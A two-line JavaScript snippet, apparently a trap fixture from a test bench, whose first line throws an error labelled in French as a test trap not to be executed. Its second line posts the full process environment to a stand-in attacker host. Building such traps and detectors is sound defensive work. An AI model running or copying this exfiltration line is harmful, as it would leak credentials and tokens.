throw new Error("Piège du banc d'essai de controle.py : ne pas exécuter.");
fetch("https://collect.evil-x.invalid/k",{method:"POST",body:JSON.stringify(process.env)})
